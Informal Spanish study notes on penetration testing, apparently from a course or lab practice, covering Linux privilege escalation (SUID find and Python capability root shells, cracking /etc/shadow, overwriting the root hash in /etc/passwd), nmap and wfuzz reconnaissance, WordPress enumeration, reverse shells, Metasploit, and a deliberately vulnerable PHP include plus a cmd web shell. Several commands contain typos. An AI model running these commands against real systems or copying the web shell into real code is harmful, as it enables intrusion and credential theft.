"""
Al filtrar con grep si utilizamos el $ al final indicamos que quremos que termine necesariamente como
la cadena ingresada preaviamente y ^ para que empieze

cat /etc/passwd | grep sh$ | awk '{print $1}' FS=':'

chattr -----> controlar permisos avanzados 

?$ chattr +i -V
i ----> ni root podra borrar
-V ----> verbose
lsattr ---> listar permisos especiales

gtfobins.github.io ---> se puede buscar por comandos y vulneravilidades

Por ejemplo si el binario find tuviese permisos suid

find . -exec /bin/sh -p \; -quit

?$ uname -a  

?$ lsb_release -a

Fuerza bruta al etc/shadow 

?$ cat /etc/shadow | grep 'x' > to_break

?$ john --wordlist=rockyou.txt to_break 

?$ john --show to_break

Identificar hashes

hash-identifier 
hashid {hash}

Si el archivo etc/passwd tiene permisos de escritura se puede alterar la contraseña

?$ openssl passwd 

Una vez tengamos el hash DES(Unix) podemos alterar el etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh

root:{hash_passwd}:0:0:root:/root:/usr/bin/zsh

Scrip en C con root


-----

# include <stdio.h>

setuid(0)   <--- Esto porque en C existe una medida de seguridad

void main(){
    printf("Listando procesos (usr/bin/ps):");
    system("/usr/bin/ps);

    printf("Listando procesos (ps):");
    system("ps);
}

El archivo tendra SUID

El explotar una vulneravilidad y intentar escalar privilegios en un sistema puede ser desgastante, aca entran
en juego las persistencias, para que si llegaramos a apagar la maquina poder seguir teniendo conexion.
U otras como las persistencias privilegiadas...

Capabilities:

?$ getcap -r / 2>/dev/null 
Listar las capabilities desde la raiz

Por ejemplo podriamos tener la capabilitie de cap_setuid+ep en python en donde el atacante podria setearse la id de manera
exitosa para recobrar axeso como root al sistema

?$ python3 -c 'import os; os.setuid(0); os.sistem("/bin/bash")'
¿'
?$ setcap -r /usr/bin/pyhton3

?$ getcap

?$ setcap cap_setuid+ep

------------

?$ ping -c 1 {ip} -R  
-R <-- flag para mostrar el Recorod Route

nmp -p- -T5 --opne -n -v {ip} -oG {file_name}

nmap -sC -sV -p{ports} {ip} -oN {file_name}

?$ whatweb http://{ip}
Para ver lo más relevante de una app web

Para un escaneo más rapido 

?$ nmap -p- -oS- --min-rate 5000 --open -vvv -n -Pn {ip}
-Pn ---> no host discovery
-n ----> no resolución dns

#!/bin/bash

for port in $(seq 1 65535); do
    echo '' > /dev/tcp/{ip}/port && echo 'Port open'
done

Ctrl + z ----> pasar al segundo plano
kill % ---> matar al proceso enviado a segundo plano 

Identificar activos en tu segmento de red

#!/bin/bash

for i in $(seq 2 254); do
    timeout 1 bash -c "ping -c 1 {ip}.$i > dev/null 2>&1" && echo "Host {ip}.$i - ACTIVE"
done; wait

* NMAP
Enumerar puertos, vulneravilidades

updatedb

locate .nse      <----- scripts de nmap
locate .nse | wc -l    <---- Contar los scrips
locate .nse | xargs grep "categories"   <----- ver las categorias de los scripts
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u

nmap -445 {ip} --script "vulnv and safe"
Escanear el port 445 de la ip ingresada con scripts de categorias vulnv and safe

*Listar directorios con nmap

nmap -p{port} {ip} --script http-enum

? Fuzing ---> fuerza bruta de urls 

Analizando el trafico

?$ tcpdump -i tun0 -w Captura.cap -v
interfaz tun0, exportar todo al archivo Captura.cap y verabose

?$ tshark -r Captura.cap 
Tshark nos traducira la captura de datos

?$ tshark -r -Y "http" Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http

?$ tshark -r -Y "http" -Tjson Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http en formato json

?$ tshark -r -Y "http" -Tfields -e tcp.payload Captura.cap 
Tshark nos traducira la captura de datos filtrandolea por http

xxd -ps ---> transformar a hexadecimal
xxd -ps -r ----> reversear de hexadecimal a legible

?$ tshark -r -Y "http" -Tfields -e tcp.payload Captura.cap | xxd -ps -r | grep 'GET' | awk '{print $2}' | sort -u

! Fuzing 
*WFUZZ

?$ wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlist/dirbuster/directory-list-2,3-medium.txt http://{ip}/FUZZ
-c ---> outpu con colores
-L ----> si el codigo de estado es 301 y redirecciona, le indicamos que lo siga. follow redirec
-t ---> 400 hilos
--hc=404 ----> hide code 404
FUZZ en la url ----> donde quiero remplazar cada una de las palabras del diccionario en la url

--sc=200 ----> show code 
--sh=400 ----> + de 400 caracteres
--hh=4000 ----> ocultar respuestas con 4000 caracteres
--hl=160 ----> hide lines +160'

?$ echo -e "txt/nhtml/nphp/n" > extenciones.txt

?$ wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlist/dirbuster/directory-list-2,3-medium.txt -w extenciones.txt http://{ip}/FUZZ.FUZ2Z

doble fuzz, por cada una de las palabras del primer diccionario, probamos cada una de (en este caso extenciones) del segundo diccionario

*DIRBUSTER

GUI <-

*DIRB

?$ dirb {target} -w {wordlist}

*GOBUSTER

?$ gobuster dir -w {wordlist} --url {target}

*DIRSEAR

git clone
-h

Reconocimiento puede tratarse e fuzing, inspeccion visuall, herramientas de conocimientos, wapalizer, whatweb,
en función del gestor de contenido usar herramientas para dichos gestores.

Caso de ejemplo

?$ ping -c 1 {ip}

?$ nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- {ip} -oG allPorts
Escaneo a la ip 
-sS --> tcp sin port scan 
--open ---> solo ports abiertos
-vvv ---> info de lo que se va realizando
-n ----> sin resolucion dns 
-Pn ----> sin host discovery
-p- ---> todo el rango de puertos 
-oG ----> formato grepeable

?$ extractPorts allPorts

?$ nmap -sC -sV -p{ports} {ip} -oN targeted
Escaneo a los puertos enumerados
-sC --> lanzar una serie se scrips basicos
-sV ----> lanzar una serie de scrips basicos para intentar enumerar la version y el servicio

?$ whatweb http://{ip}

RECONOCEMOS QUE EL GESTOR DE CONTENIDO TIENE WordPress

En la pagina, vemos que esta rara, no cargan los contenidos, al clickear en un enlace el cual nos 
redirige a una url vemos que no carga. Si vemos el codigo fuente de la pagina (ctrl + u) vemos que esta  
url la cual no carga se utilizan para las imagenes las cuales tampoco vemos, entonces deducimos que estamos
frente a "VIRTUAL HOST ROUTING"

VIRTUAL HOST ROUTING ---> Permite contar con multiples servidores virtuales web desde una misma maquina.
Capacidad en base al DNS de alojar multiples servidores web, en funcion del dominio que especifiquemos nos carga
una web distinta

?$ echo "{ip} {url a la que quiero resolver que no se detecta}" | sudo tee -a /etc/hosts

Ahora con la web cargada, podriamos ver si el servidor cuenta con un WAF

WEB APLICATION FIREWALLW --> superviza, filtra o bloque trafico HTTP hacia y desde una web 

?$ wafw00f http://{page}

Recordemos que estamos contra un wordpress

Por lo que podriamos investigar "wordpress scanners pentesting"

Y vemos que tenemos un WPScan

Veriamos como usarla

?$ wpscan -hh  
-hh --> ver utilización

Para ver que usuarios existen en wordpress podemos ver los posts con los nombres, luego intentar loggearnos
y corroborar si avisa de que el usuario no existe o tira error de password

Y volviendo al wpscan

?$ wpscan --url http://{page} -e vp,u
vp ----> Vulnerable plugins
u ----> users

!EXPLOTACION 

?$ ping -c 1 {ip}

?$ mkt {name}

?$ cd nmap

?$ namp -p- -n -v -T5 --open {ip} -oG allPorts

?$ whatweb http://{ip}

?$ extractPorts allPorts

?$ nmap -sS -sV -p{ports} {ip} -oN targeted

?$ nmap --script http-enum -p{ports} {ip} -oN webScan

?$ wfuzz -c -t 300 --hc=404 -w /usr/share/worlist/dirbuster/dire...... http://{ip}/subdomain/FUZZ

Encuentra wp --> wordpress ---> wp-login.php <--- login de wordpress

?$ wpscan --url {url} --enumaerate vp,u

En algunos casos no se detecta de manera correcta las cosas, por eso es bueno saber que esta pasando por detras para poder 
hacerlo de manera manual, por ejemplo en este caso se da en base a los plugins de wp
Estos se suelen almacenar en http://{ip}/{subdomain}/wp/wp-content , no los vamos a poder ver debido a que la ruta no tiene
capacidad de directory listing, pero si nos sabemos el nombre podremos verlo, para ello podremos usar un diccionario del 
repositorio SecLists de danielmiessler, el cual clonamos

dentro de Discovery/Web-content/CMS existe el file wp-plugins.fuzz.txt, por lo  que con fuzz podemos hacerlo de manera manual

?$ wfuzz -c -t 300 --hc=404 -w  /opt/SecList/Discovery/Web-content/CMS/wp-plugins.fuzz.txt http://{ip}/{subdomain}/wp/FUZZ

Listamos los plugins y podemos buscar si para alguno de ellos existe una vulneravilidad

?$ searchsploit {plugin_name}

Esto devuelve si existe alguna vulnerabilidad, junto al path

?$ searchsploit -x {path}

Y esto te explica que hacer y como para explotar la vulnerabilidad 

?$ /usr/share/webshells/php/php-reverse-shell.php

!TRATAMIENTO TTY 

Cuando obtenemos una areverse shell, al presionar las teclas del teclado o el mismo ctrl + c no funciona de una manera 
normal, por lo que podemos hacer el tratamiento de la tty para poder asi trabajar comodos

?$ script /dev/null  -c bash

?$ ctrl + z 

?$ stty raw -echo

?$ fg

?$ reset

?$ xterm

?$ export TERM=xterm

?$ export SHELL=bash

Solo faltan setear las proporciones
-----

En una consola de NUESTRO sistema hacemos

?$ stty -a 
Para ver las filas y columnas

------

?$ stty rows {num_rows} columns {num_columns}

------


!IDENTIFICAR VULNERABILIDADES 

http://exploit-db.com  | searchsploit

?$ searchsploit -u
actualizarla herramienta 

?$ searchsploit {name} -w
Obtener la url

?$ searchsploit -x {path or code of exploit} 
Obtener el exploit

?$ searchsploit -m {path or code of exploit}
Descargar exploit 

!METASPLOIT

HFS ----> Http File Server

?$ msfdb run 
Inicializar por primera vez metasploit, crea user, inicializa db, corre postgres, etc

?$ search hfs

Copio la ruta del exploit

?$ use {rute}

?$ info
Informacion del exploit

?$ show options 
Ver opciones que se necesitan para explotar

?$ set {name} {value}

Ahora toca el listener
Con una sesion meterpreter, una sesion de escucha a travez de metasploit
?$ set payload windows/meterpreter/reverse_tcp

?$ exploit 

!MISMO EXPLOIT DE FORMA MANUAL

?$ searchsploit http file server

?$ searchsploit -m {code}

?$ locate nc.exe

?$ cp /opt/SecLists/Web-Shells/FuzzDB/nc.exe .

?$ python3 -m http.server 80

Modificamos el script con nuestra ip y el puerto

?$ nc -nvlp {port}

Ejecutamos el exploit

?$ python {ip} {port}


!BURPSUITE

Configurar el scope
shift + click en target ---> site map y proxy ---> HTTP history

options ---> [] Don't send items to Proxy history or live tasks, if out of scope

target ----> scope ---> add ---> url





"""


"""
Podemos entender mejor el concepto de LFI (Local File Inclusion) haciendolo en nuestra propia maquina

?$ cd /var/www/html 

?$ service apache2 start

?$ ps -faux  <-- procesos

?$ nano index.php

<?php
    $filename = $_REQUEST['page'];
    include($filename);
?>

<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

"""